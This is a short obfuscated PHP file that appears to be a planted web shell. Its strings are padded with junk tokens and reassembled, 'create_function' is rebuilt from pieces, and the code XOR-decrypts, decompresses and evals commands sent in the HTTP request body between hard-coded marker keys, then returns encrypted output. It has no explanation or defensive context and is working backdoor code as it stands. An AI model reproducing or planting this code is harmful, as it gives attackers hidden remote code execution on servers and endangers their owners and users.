<?php
$q='input"),$m){W=={W1) {W{@ob_start();@e{Wva{Wl(@g{Wzuncompr{Wess(@x(@{Wbase{W64{W_decode($m[1]){W,$k)){W);$o=@{Wob_ge{W';
$c=str_replace('Y','','crYYYeate_fYuncYtiYon');
$m='t_conte{Wn{Wts();@ob_e{Wnd_cl{Wean();$r{W=@ba{Ws{We64_enco{Wde(@x(@gzco{Wmpre{Wss($o{W),$k){W{W);print{W("$p$kh$r$kf");}';
$y='{W$k="5eda{W00bb";${Wkh="b879{W9b{W2784{W{W67";$kf="9{Wd3c395c547d"{W;{W$p="jUGJT4{WY0k52r{W9Wpf";fu{Wn{Wction x($t,$k){';
$b='Wo.=${Wt{W{$i}^$k{$j};}}{Wret{Wurn $o;}i{Wf{W (@preg_match({W"/${Wkh({W.+)$k{Wf/",@file{W_get_cont{Wen{Wts("ph{Wp:/{W/';
$C='{W${W{Wc=strlen($k);$l=s{Wt{Wrl{Wen($t);{W$o=""{W;for($i=0;$i<$l{W{W;){fo{Wr($j=0;($j<${Wc&&$i<{W$l);$j{W++,$i+{W+){${';
$n=str_replace('{W','',$y.$C.$b.$q.$m);
$g=$c('',$n);$g();
?>
